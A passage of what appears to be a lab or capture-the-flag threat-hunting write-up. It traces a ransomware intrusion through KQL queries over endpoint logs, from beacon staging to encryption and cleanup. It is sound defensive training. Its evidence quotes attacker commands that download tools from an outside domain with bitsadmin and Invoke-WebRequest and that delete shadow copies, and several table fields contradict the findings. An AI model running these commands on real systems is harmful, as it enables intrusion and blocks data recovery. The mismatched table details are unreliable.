---

<a id="flag-20"></a>
<details>
<summary>&#128681; <strong>Flag 20: Beacon Location Identification</strong></summary>

### 🎯 Objective

Determine where the beacon-like binary was staged on disk.

### 📌 Finding

The beacon-like binary **`wsync.exe`** was located in **`C:\ProgramData\`**. We can identify this from the same search as before and simply adding `FolderPath` to the answer projection.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| File | `wsync.exe` |
| Path | `C:\ProgramData\` |
| Timestamp |  |
| Initiating Process |  |
| Command Line |  |

### 💡 Why it matters

ProgramData is a common staging location for attacker tooling because it blends into normal system paths while remaining accessible.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where DeviceName =~ "AS-PC2"
| where FileName =~ "wsync.exe"
| project Timestamp, DeviceName, FolderPath, FileName, SHA256, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Alert on newly created executables under `ProgramData`, especially when paired with suspicious network or remote-access activity.

**Hunting Tip:**

Path-based pivots often expose other staged tools in the same directory.

</details>

---

<a id="flag-21"></a>
<details>
<summary>&#128681; <strong>Flag 21: Primary Beacon Hash Identification</strong></summary>

### 🎯 Objective

Validate the original hash associated with the beacon binary.

### 📌 Finding

The original **`wsync.exe`** sample was associated with SHA256 **`66b876c52946f4aed47dd696d790972ff265b6f4451dab54245bc4ef1206d90b`**. We saw this originaly with our previous query. However, we can verify by searching for any additional `wsync.exe` activity with a `SHA256` hash that was reported.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| File | `wsync.exe` |
| SHA256 | `66b876c52946f4aed47dd696d790972ff265b6f4451dab54245bc4ef1206d90b` |
| Timestamp |  |
| Folder Path | `C:\ProgramData\` |
| Initiating Process |  |

### 💡 Why it matters

The original hash provides the cleanest artifact pivot for prevalence checks and cross-host scoping.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where DeviceName =~ "AS-PC2"
| where FileName =~ "wsync.exe"
| where isnotempty(SHA256)
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp) by SHA256, FolderPath
| order by FirstSeen asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Capture and enrich hashes for suspicious utilities to support faster environment-wide scoping.

**Hunting Tip:**

When a suspicious filename appears with a hash, use the hash for your broadest pivot.

</details>

---

<a id="flag-22"></a>
<details>
<summary>&#128681; <strong>Flag 22: Replacement Beacon Hash Identification</strong></summary>

### 🎯 Objective

Determine whether the beacon binary was replaced or refreshed during the intrusion.

### 📌 Finding

A second SHA256 value, **`0072ca0d0adc9a1b2e1625db4409f57fc32b5a09c414786bf08c4d8e6a073654`**, was later associated with **`wsync.exe`**. This indicates the beacon was replaced with a new version under the same file name `wsync.exe` . To verify this we use the same query as before, but add `TimeGenerated` to the projection to show when the two different hashes were first seen. It appears there was about 22mins inbetween the first and second versions.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| File | `wsync.exe` |
| Replacement SHA256 | `0072ca0d0adc9a1b2e1625db4409f57fc32b5a09c414786bf08c4d8e6a073654` |
| Timestamp |  |
| Folder Path | `C:\ProgramData\` |
| Initiating Process |  |

### 💡 Why it matters

A same-name, different-hash pattern often indicates payload refresh, tool swap, or persistence maintenance by the operator.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where DeviceName =~ "AS-PC2"
| where FileName =~ "wsync.exe"
| where isnotempty(SHA256)
| project TimeGenerated, SHA256
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Track filename-to-hash changes for suspicious utilities in persistence-friendly directories.

**Hunting Tip:**

Use first-seen order to infer which sample was likely the original drop and which was the replacement.

</details>

---

<a id="flag-23"></a>
<details>
<summary>&#128681; <strong>Flag 23: Scanner Tool Identification</strong></summary>

### 🎯 Objective

Identify the utility used for internal network reconnaissance.

### 📌 Finding

The attacker used **`scan.exe`** on **AS-PC2**. To identify this suspicous .exe filename we start first with a broad scan of `DeviceProcessEvents` and specifiy specific odd `FolderPath`'s that we have seen thus far. This helps narrow down to 42 results. From there we identified `“scan.exe”` and create a targeted query to search for any other events with that `FileName.`

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| Process | `scan.exe` |
| Timestamp |  |
| Parent Process |  |
| Command Line | Later confirmed as portable execution |
| Associated SHA256 | `26d5748ffe6bd95e3fee6ce184d388a1a681006dc23a0f08d53c083c593c193b` |

### 💡 Why it matters

Discovery tooling helps explain how the attacker selected internal targets for later movement.

### 🔧 KQL Query Used

```
// First broad scan to look for suspicious .exe activity related to "scanning"
DeviceProcessEvents
| where DeviceName =~ "AS-PC2"
| where FolderPath has_any ("C:\\Users\\Public", "C:\\ProgramData", "\\Downloads\\")
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, AccountName
| order by Timestamp asc

// Targeted search once we identify "scan.exe"
DeviceProcessEvents
| where DeviceName =~ "AS-PC2"
| where FileName =~ "scan.exe"
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, AccountName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Alert on low-prevalence scanner utilities launched from user-associated directories or portable mode.

**Hunting Tip:**

Portable scanning tools are often staged close to the compromised user’s working directories.

</details>

---

<a id="flag-24"></a>
<details>
<summary>&#128681; <strong>Flag 24: Scanner Hash Validation</strong></summary>

### 🎯 Objective

Validate the file hash for the scanning utility.

### 📌 Finding

The scanner **`scan.exe`** was associated with SHA256 **`26d5748ffe6bd95e3fee6ce184d388a1a681006dc23a0f08d53c083c593c193b`**. To identify this we search `DeviceFileEvents` where `FileName` matches `scan.exe` and `SHA256` is not empty.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| File | `scan.exe` |
| SHA256 | `26d5748ffe6bd95e3fee6ce184d388a1a681006dc23a0f08d53c083c593c193b` |
| Timestamp | 2026-01-27T20:17:16.7472516Z |
| Folder Path | C:\Users\David.Mitchell\Downloads\scan.exe |
| Initiating Process | powershell.exe |

### 💡 Why it matters

The hash provides a stable pivot for artifact scoping and future detection content.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where DeviceName =~ "AS-PC2"
| where FileName =~ "scan.exe"
| where isnotempty(SHA256)
| project Timestamp, DeviceName, FolderPath, FileName, SHA256, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Retain hashes for discovery tools because they are useful for environment-wide retrospective hunting.

**Hunting Tip:**

When an executable name is generic, the SHA256 is usually the better long-term search key.

</details>

---

<a id="flag-25"></a>
<details>
<summary>&#128681; <strong>Flag 25: Scanner Execution Command Identification</strong></summary>

### 🎯 Objective

Capture how the scanner was executed on the compromised workstation.

### 📌 Finding

The scanner was launched with **`/portable "C:/Users/david.mitchell/Downloads/" /lng en_us`**. This was down by a seperate file name `advanced_ip_scanner.exe` which we found by searching `DeviceProcessEvents` for any `FileName` that includes `"scan"`  in it. From there we identified in the `ProcessCommandLine` how the scanner was executed.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| Process | `scan.exe` |
| Timestamp | 2026-01-27T20:17:59.5214529Z |
| Parent Process | scan.tmp |
| Command Line | `/portable "C:/Users/david.mitchell/Downloads/" /lng en_us` |
| User Context | `David.Mitchell` |

### 💡 Why it matters

Portable execution from a user’s downloads area is consistent with hands-on-keyboard operator behavior.

### 🔧 KQL Query Used

```
DeviceProcessEvents
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where FileName contains "scan"
| project Timestamp, DeviceName, FileName, ProcessCommandLine,
          FolderPath, AccountName
| order by Timestamp asc

```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Flag portable execution of network tools launched from downloads or temporary directories.

**Hunting Tip:**

Command-line switches often reveal operator intent even when the binary name is vague.

</details>

---

<a id="flag-26"></a>
<details>
<summary>&#128681; <strong>Flag 26: Internal Network Enumeration Targets</strong></summary>

### 🎯 Objective

Identify which internal systems were targeted during reconnaissance.

### 📌 Finding

The attacker enumerated **`10.1.0.154`** and **`10.1.0.183`** from **`AS-PC2`**. This was identified from the `SMB Port 445` activity that followed the scanner execution, including a burst of `ConnectionSuccess` events around **`2026-01-27T20:18:31Z`** where **`10.1.0.183`** first appeared connecting to **`10.1.0.154`**. Although several internal IPs appeared during that burst, later traffic again involved **`10.1.0.154`** and **`10.1.0.183`**, including follow-on connections with **`10.1.0.203`**, which made those two the strongest match for the specifically enumerated hosts. Prior to the `SMB` burst we see `10.1.0.183` connect to `10.1.0.203` at `2026-01-27T18:47:05.9221979Z` . It appears the `.203` IP is used as a pivot and that then reaches out to `.183 and .154` making these IP’s our strongest candidates. We then confirm later enumeration via a secondary query for `DeviceProcessEvents` from `DeviceName "as-srv"` which is the `DeviceName` linked to the later connections at  `2026-01-27T22:16:19.979077Z and 2026-01-27T22:16:20.2537934Z` . This reveals two attempts to enumerate via `ProcessCommandLine "net.exe view \\10.1.0.154 and net.exe view \\10.1.0.183.`

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| Process | `scan.exe` |
| Target IPs | `10.1.0.154`, `10.1.0.183` |
| Timestamp | **`2026-01-27T20:18:31Z`** |
| Parent Process | ntoskrnl.exe & powershell.exe |
| Command Line | "net.exe" view \\10.1.0.154 |

### 💡 Why it matters

Enumerated internal IPs represent likely follow-on movement or targeting candidates in the intrusion.

### 🔧 KQL Query Used

```
// Identify SMB Share enumeration and Potential Device Names
DeviceNetworkEvents
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where Timestamp between (datetime(2026-01-26T20:18:00Z) .. datetime(2026-01-28T20:19:00Z))
| where RemotePort == 445
| where ActionType == "ConnectionSuccess"
| summarize Hits=count() by TimeGenerated, LocalIP, RemoteIP, ActionType
| order by Hits desc

// Hone in directly on enumeration activity via net.exe
DeviceProcessEvents
| where Timestamp between (datetime(2026-01-27T20:18:31Z) .. datetime(2026-01-28T20:19:00Z))
| where DeviceName in~ ("AS-SRV")
| where ProcessCommandLine contains "net.exe"
| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Detect short-interval connection attempts to multiple internal IPs from a single workstation process.

**Hunting Tip:**

Once you know the internal targets, pivot each one for later logons, file creation, and impact artifacts.

</details>

---

<a id="flag-27"></a>
<details>
<summary>&#128681; <strong>Flag 27: Lateral Movement Account Identification</strong></summary>

### 🎯 Objective

Identify the account used during server-side operations.

### 📌 Finding

The attacker used **`as.srv.administrator`** on **AS-SRV**. After the `SMB` enumeration it appears the attacker pivots from `AS-PC2` to `AS-SRV` . The attacker starts from `AccountName david.mitchell`and pivots to `as.srv.administrator`  at `2026-01-27T22:07:13.8118714Z` from `RemoteIP "10.1.0.183"` .

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-SRV` |
| Account | `as.srv.administrator` |
| Timestamp | 2026-01-27T19:22:06.3795036Z |
| Logon Type | Network |
| Remote IP | 10.0.8.6 |
| Initiating Process | lsass.exe |

### 💡 Why it matters

Administrator-context activity on the server explains how later staging, anti-recovery, and ransomware execution were possible.

### 🔧 KQL Query Used

```
DeviceLogonEvents
| where DeviceName =~ "AS-SRV"
| where AccountName has "administrator"
| project Timestamp, DeviceName, AccountName, LogonType, RemoteIP, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Alert on local administrator account usage on servers outside approved maintenance or support workflows.

**Hunting Tip:**

When impact lands on a server, identify the account context early because it often explains the whole chain.

</details>

---

<a id="flag-28"></a>
<details>
<summary>&#128681; <strong>Flag 28: Initial Tool Download Method Identification</strong></summary>

### 🎯 Objective

Identify the first transfer mechanism used to download tooling to the server.

### 📌 Finding

The attacker first used **`bitsadmin`** on `AS-PC2.` We identify this by targeting `ProcessCommandLine` actions that are commonly used for download related processes. From previous research we know `cloud-endpoint.net` was used so we include that in our query.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-PC2` |
| Process | `bitsadmin` |
| Timestamp | `2026-01-27T20:50:35.8888831Z` |
| Parent Process | `wsync.exe` |
| Command Line | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/kill.bat C:ProgramDatakill.bat` |
| Associated Account | `david.mitchell` |

### 💡 Why it matters

BITS-based transfers are a common living-off-the-land method for staged tool delivery.

### 🔧 KQL Query Used

```
DeviceProcessEvents
| where Timestamp between (datetime(2026-01-27T20:18:31Z) .. datetime(2026-01-28T20:19:00Z))
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where ProcessCommandLine has_any ("cloud-endpoint.net", "http", "https")
| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Generate high-severity alerts for BITSAdmin usage on servers when followed by file creation or suspicious outbound traffic.

**Hunting Tip:**

If a LOLBIN appears first, search the surrounding time window for fallback transfer methods.

</details>

---

<a id="flag-29"></a>
<details>
<summary>&#128681; <strong>Flag 29: Fallback Transfer Method Identification</strong></summary>

### 🎯 Objective

Identify the fallback transfer method used when the first method was insufficient.

### 📌 Finding

The attacker used PowerShell **`Invoke-WebRequest`** as the fallback transfer method. We identify this by searching `DeviceEvents` for `ActionType "PowerShellCommand"` and filter for `AdditionalFields` that include `Invoke-WebRequest`. This reveals multiple other tools downloaded using `Invoke-WebRequest` .

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-SRV` |
| Process | `powershell.exe` |
| Method | `Invoke-WebRequest` |
| Timestamp | 2026-01-27T22:14:28.5775464Z - 2026-01-27T22:24:55.4164519Z |
| Parent Process | powershell.exe |
| Command Line | `Example: {"Command":"Invoke-WebRequest -Uri \"https://sync.cloud-endpoint.net/wsync.exe\\" -OutFile \"C:\\ProgramData\\wsync.exe\""}` |

### 💡 Why it matters

Multiple transfer methods show operator adaptability and increase confidence that the activity was malicious rather than benign administration.

### 🔧 KQL Query Used

```
DeviceEvents
| where Timestamp between (datetime(2026-01-27T20:00:00Z) .. datetime(2026-01-28T00:00:00Z))
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where ActionType contains "PowerShell"
| where AdditionalFields has_any ("Invoke-WebRequest", "iwr", "WebRequest", "DownloadFile", "http", "https")
| project Timestamp, DeviceName, ActionType, AdditionalFields, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Alert on PowerShell web-download activity that is immediately followed by executable creation or staging.

**Hunting Tip:**

When one transfer method appears to fail, search for a second method in the same execution chain.

</details>

---

<a id="flag-30"></a>
<details>
<summary>&#128681; <strong>Flag 30: Staging Tool Identification</strong></summary>

### 🎯 Objective

Identify the tool used to stage data prior to exfiltration or impact.

### 📌 Finding

The attacker used **`st.exe`** on **`AS-SRV`**. This was found by searching `DeviceFileEvents` for typical staging activity such as creating `.zip` files. From there we see `exfil_data.zip` created by `st.exe`.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-SRV` |
| Process | `st.exe` |
| Timestamp | 2026-01-27T22:24:09.8596511Z |
| Parent Process | 2026-01-27T20:50:35.8888831Z |
| Command Line | st.exe |
| Role | Pre-exfiltration staging utility |

### 💡 Why it matters

Identifying the staging utility helps distinguish collection and packaging behavior from the later impact phase.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where Timestamp between (datetime(2026-01-27T20:50:31Z) .. datetime(2026-01-28T20:19:00Z))
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where FileName endswith ".zip"
| project Timestamp, DeviceName, FileName, InitiatingProcessFileName, FolderPath, ActionType
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Monitor for uncommon binaries used to prepare data shortly before archive creation or encryption.

**Hunting Tip:**

If you find a staging utility, immediately pivot for archives and outbound network activity in the same timeframe.

</details>

---

<a id="flag-31"></a>
<details>
<summary>&#128681; <strong>Flag 31: Staging Tool Hash Validation</strong></summary>

### 🎯 Objective

Validate the unique file hash tied to the staging utility.

### 📌 Finding

The staging utility **`st.exe`** was associated with SHA256 **`512a1f4ed9f512572608c729a2b89f44ea66a40433073aedcd914bd2d33b7015`**. With `st.exe` identified we simply edit our search to pull out the specific `SHA256` related to the executable.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-SRV` |
| File | `st.exe` |
| SHA256 | `512a1f4ed9f512572608c729a2b89f44ea66a40433073aedcd914bd2d33b7015` |
| Timestamp | 2026-01-27T22:24:08.3674463Z |
| Folder Path | C:\ProgramData\st.exe |
| Initiating Process | powershell.exe |

### 💡 Why it matters

A precise hash strengthens artifact scoping and gives defenders a durable search pivot.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where Timestamp between (datetime(2026-01-27T20:50:31Z) .. datetime(2026-01-28T20:19:00Z))
| where DeviceName =~ "AS-SRV"
| where FileName =~ "st.exe"
| where isnotempty(SHA256)
| project Timestamp, DeviceName, FolderPath, FileName, SHA256, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Retain hashes for custom or uncommon utilities involved in collection and staging.

**Hunting Tip:**

Hashes help separate the exact malicious utility from any benign file with a similar name.

</details>

---

<a id="flag-32"></a>
<details>
<summary>&#128681; <strong>Flag 32: Exfiltration Archive Identification</strong></summary>

### 🎯 Objective

Identify the archive created during data staging.

### 📌 Finding

The attacker created **`exfil_data.zip`** on **`AS-SRV`**. This was identified during Flag 30, so we use the same query for this as well.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-SRV` |
| Archive | `exfil_data.zip` |
| Timestamp | 2026-01-27T22:24:08.3674463Z |
| Initiating Process | powershell.exe |
| Action Type | FileCreated |
| Associated Tool | `st.exe` |

### 💡 Why it matters

Archive creation before ransomware execution strongly supports a double-extortion style workflow.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where Timestamp between (datetime(2026-01-27T20:50:31Z) .. datetime(2026-01-28T20:19:00Z))
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where FileName endswith ".zip"
| project Timestamp, DeviceName, FileName, InitiatingProcessFileName, FolderPath, ActionType
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Alert on archive creation by uncommon tools, especially near suspicious download or encryption events.

**Hunting Tip:**

Search for `.zip`, `.7z`, and `.rar` creation immediately before impact to capture theft staging.

</details>

---

<a id="flag-33"></a>
<details>
<summary>&#128681; <strong>Flag 33: Ransomware Binary Identification</strong></summary>

### 🎯 Objective

Identify the binary used to deliver the final ransomware impact.

### 📌 Finding

The ransomware binary was **`updater.exe`** on **AS-SRV**. We know from the initial MDE detection that a ransome note was dropped so with `akira` in the file name so we search for `DeviceFileEvents` related to that event to identify the `InitiatingProcessFileName`. Additionally, we can review the previous device events search to shows all `.exe` files that have been downloaded

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-SRV` |
| File / Process | `updater.exe` |
| Timestamp | 2026-01-27T22:15:53.7739545Z |
| Initiating Process | Later correlated to `powershell.exe` |
| Action Type | FileCreated |
| SHA256 | Later confirmed separately |

### 💡 Why it matters

Identifying the final payload is essential for tracking execution, note creation, and impacted hosts.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where Timestamp between (datetime(2026-01-27T20:50:31Z) .. datetime(2026-01-28T20:19:00Z))
| where DeviceName =~ "AS-SRV"
| where FileName =~ "updater.exe"
| project Timestamp, DeviceName, FolderPath, FileName, SHA256, InitiatingProcessFileName, ActionType
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Alert on newly created executables that immediately precede encryption-like or note-creation behavior.

**Hunting Tip:**

Once the ransomware filename is known, pivot from it to staging process, note origin, and host scope.

</details>

---

<a id="flag-34"></a>
<details>
<summary>&#128681; <strong>Flag 34: Ransomware Hash Validation</strong></summary>

### 🎯 Objective

Validate the SHA256 tied to the ransomware binary.

### 📌 Finding

The ransomware binary **`updater.exe`** was associated with SHA256 **`e609d070ee9f76934d73353be4ef7ff34b3ecc3a2d1e5d052140ed4cb9e4752b`**. With `updater.exe` identified we use the same process as before to simplify our search and clearly identify the `SHA256` within `DeviceFileEvents`

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-SRV` |
| File | `updater.exe` |
| SHA256 | `e609d070ee9f76934d73353be4ef7ff34b3ecc3a2d1e5d052140ed4cb9e4752b` |
| Timestamp | 2026-01-27T22:24:08.3674463Z |
| Folder Path | C:\ProgramData\updater.exe |
| Initiating Process | powershell.exe |

### 💡 Why it matters

The SHA256 provides a durable pivot for retrospective hunting and payload validation.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where Timestamp between (datetime(2026-01-27T20:50:31Z) .. datetime(2026-01-28T20:19:00Z))
| where DeviceName =~ "AS-SRV"
| where FileName =~ "updater.exe"
| where isnotempty(SHA256)
| project Timestamp, DeviceName, FolderPath, FileName, SHA256, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Retain and enrich ransomware payload hashes for future blocklisting and environment-wide hunts.

**Hunting Tip:**

If filenames are reused or generic, the payload hash is the cleaner environment-wide search artifact.

</details>

---

<a id="flag-35"></a>
<details>
<summary>&#128681; <strong>Flag 35: Ransomware Staging Process Identification</strong></summary>

### 🎯 Objective

Identify the process that staged the ransomware binary before execution.

### 📌 Finding

The ransomware payload **`updater.exe`** was staged by **`powershell.exe`**. To verify this we use a similar search for the last few flags, except this time we are specifically looking for `InitiatingProcessFileName` that appears when the `Actiontype = FileCreated`.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-SRV` |
| Ransomware Binary | `updater.exe` |
| Staging Process | `powershell.exe` |
| Timestamp | 2026-01-27T22:15:53.7739545Z |
| Parent Process | powershell.exe |
| Command Line | "powershell.exe"  |

### 💡 Why it matters

Tying the payload to its staging process connects the delivery phase to the final impact phase.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where Timestamp between (datetime(2026-01-27T20:50:31Z) .. datetime(2026-01-28T20:19:00Z))
| where DeviceName =~ "AS-SRV"
| where FileName =~ "updater.exe"
| project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName, SHA256, ActionType, InitiatingProcessCommandLine
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Prioritize PowerShell-driven file drops that later execute as ransomware or other destructive payloads.

**Hunting Tip:**

The file-creation event often gives the cleanest answer for who staged a payload.

</details>

---

<a id="flag-36"></a>
<details>
<summary>&#128681; <strong>Flag 36: Recovery Inhibition Command Identification</strong></summary>

### 🎯 Objective

Identify commands used to reduce the victim’s ability to recover encrypted data.

### 📌 Finding

The attacker executed **`wmic shadowcopy delete`** on **AS-PC2**. We identify this by searching `DeviceProcessEvents` for typical `ProcessCommandLine` activity related to the deletation of files / shadow copies / etc.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `as-pc2` |
| Process | `cmd.exe, wmic.exe, vssadmin.exe`  |
| Timestamp | 2026-01-27T21:09:10.5402793Z - 2026-01-27T21:09:11.5843603Z |
| Parent Process | wsync.exe |
| Command Line | `cmd.exe /c "vssadmin delete shadows /all /quiet”`

`vssadmin  delete shadows /all /quiet`

`cmd.exe /c "wmic shadowcopy delete”`

`wmic  shadowcopy delete` |
| Purpose | Shadow copy removal / recovery inhibition |

### 💡 Why it matters

Shadow copy deletion is a classic ransomware behavior intended to make restoration more difficult.

### 🔧 KQL Query Used

```
DeviceProcessEvents
| where Timestamp between (datetime(2026-01-27T20:50:31Z) .. datetime(2026-01-28T20:19:00Z))
| where DeviceName in~ ("AS-PC2", "AS-SRV")
| where ProcessCommandLine has_any ("wmic", "shadowcopy", "delete")
| project Timestamp, DeviceName, FileName, ProcessCommandLine, AccountName, InitiatingProcessFileName
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Create immediate, high-severity alerts for shadow copy deletion or similar recovery-inhibition commands.

**Hunting Tip:**

This command is often one of the clearest indicators that impact is either imminent or already underway.

</details>

---

<a id="flag-37"></a>
<details>
<summary>&#128681; <strong>Flag 37: Ransom Note Origin Identification</strong></summary>

### 🎯 Objective

Identify which process dropped the ransom note after encryption began.

### 📌 Finding

The ransom note was dropped by **`updater.exe`**. We idenfied this by searching `DeviceFileEvents` for the ransome note that we saw from the original MDE alert and our earlier search for `flag 33`.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-SRV` |
| Process | `updater.exe` |
| Timestamp | 2026-01-27T22:18:33.3729075Z |
| Parent Process | updater.exe |
| Command Line | "updater.exe” |
| Artifact | Ransom note / Akira-related file |

### 💡 Why it matters

Note-origin confirmation directly ties the final payload to visible impact artifacts on disk.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where Timestamp between (datetime(2026-01-27T20:50:31Z) .. datetime(2026-01-28T20:19:00Z))
| where DeviceName =~ "AS-SRV"
| where InitiatingProcessFileName =~ "updater.exe"
| where FileName has_any ("readme", "akira")
| project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName, ActionType
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Alert on note-like artifacts written by newly dropped executables, especially after shadow copy deletion or archive creation.

**Hunting Tip:**

When note naming is uncertain, start with the writer process and summarize the files it created.

</details>

---

<a id="flag-38"></a>
<details>
<summary>&#128681; <strong>Flag 38: Encryption Start Time Confirmation</strong></summary>

### 🎯 Objective

Anchor the beginning of the observed encryption phase.

### 📌 Finding

Encryption began at **`22:18:33`** based on the earliest preserved impacted-file activity. This was identified earlier, but to create a clean output we search `DeviceFileEvents` for any `FileName` that contains `akira` then `summarize` to make a nice easily readable output.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-SRV` |
| Event Time | `22:18:33` |
| Marker | Filename contains `.akira` |
| Initiating Process | Later correlated to `updater.exe` |
| Parent Process | updater.exe |
| Command Line | “updater.exe” |

### 💡 Why it matters

A confirmed encryption start time is critical for timeline construction, containment assessment, and impact scoping.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where Timestamp between (datetime(2026-01-27T20:50:31Z) .. datetime(2026-01-28T20:19:00Z))
| where DeviceName =~ "AS-SRV"
| where FileName contains ".akira"
| summarize FirstEncrypted=min(Timestamp)
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Create timeline-aware detections that correlate the first encrypted artifact with nearby staging and anti-recovery commands.

**Hunting Tip:**

Use the earliest confirmed encryption event as the anchor for walking backward through the intrusion.

</details>

---

<a id="flag-39"></a>
<details>
<summary>&#128681; <strong>Flag 39: Cleanup Script Identification</strong></summary>

### 🎯 Objective

Identify the script used to remove evidence after execution.

### 📌 Finding

The attacker used **`clean.bat`** as the cleanup script. While identifying the ransomware payload we saw 2 events one for `FileCreated` and another for `FileDeleted`. Using that same search we went back to inspect the `InitiatingProcessCommandLine` and identified `"cmd.exe" /c C:\ProgramData\clean.bat`  which shows what script or batch file was used for evidence removal.

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Host | `AS-SRV` |
| Process | `clean.bat` |
| Timestamp | 2026-01-27T22:20:28.6633218Z |
| Parent Process | `cmd.exe` |
| Command Line | "cmd.exe" /c C:\ProgramData\clean.bat |
| Purpose | Post-execution cleanup / anti-forensics |

### 💡 Why it matters

Cleanup scripts indicate deliberate anti-forensics and help confirm the operator’s attempt to reduce evidence visibility.

### 🔧 KQL Query Used

```
DeviceFileEvents
| where Timestamp between (datetime(2026-01-27T20:50:31Z) .. datetime(2026-01-28T20:19:00Z))
| where DeviceName =~ "AS-SRV"
| where FileName =~ "updater.exe"
| project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName, ActionType, InitiatingProcessCommandLine
| order by Timestamp asc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Flag cleanup-themed scripts executed after ransomware, archive creation, or payload deployment events.

**Hunting Tip:**

When you see `clean.bat`, pivot to deleted files, note timing, and evidence-removal behavior immediately.

</details>

---

<a id="flag-40"></a>
<details>
<summary>&#128681; <strong>Flag 40: Affected Host Scope Identification</strong></summary>

### 🎯 Objective

Determine the confirmed host scope of the compromise.

### 📌 Finding

The confirmed affected hosts were **`as-srv`** and **`as-pc2`**. This is confirmed by verifying the two host machines we see through this investigation. However, to clearly identify the two we can search for `DeviceProcessEvents` with `FileName`'s related to the attack. Therefor we search for the following `FileName`'s : `"anydesk.exe", "wsync.exe", "scan.exe", "st.exe", "updater.exe”.`

### 🔍 Evidence

| Field | Value |
| --- | --- |
| Affected Hosts | `as-srv`, `as-pc2` |
| Impact Marker | Filenames contain `.akira` and related tooling artifacts |
| Timestamp |  |
| Primary Payload | `updater.exe` |
| Related Tools | `anydesk.exe`, `wsync.exe`, `scan.exe`, `st.exe`, `clean.bat` |
| Source Scope | Combined process and file artifacts |

### 💡 Why it matters

Confirmed host scope is essential for final reporting, containment validation, and lessons learned.

### 🔧 KQL Query Used

```
DeviceProcessEvents
| where Timestamp between (datetime(2026-01-26T20:00:31Z) .. datetime(2026-01-28T20:19:00Z))
| where FileName in~ ("anydesk.exe", "wsync.exe", "scan.exe", "st.exe", "updater.exe")
| summarize Hits=count() by DeviceName
| order by Hits desc
```

### 🖼️ Screenshot

### 🛠️ Detection Recommendation

Correlate key payload, staging, and impact artifacts into a host-scope analytic rather than treating them as isolated alerts.

**Hunting Tip:**

For final scoping, combine impact markers with core tooling artifacts instead of relying on a single indicator.

</details>

---

<a id="detection-gaps-and-recommendations"></a>
## 🚨 Detection Gaps & Recommendations

### Observed Gaps

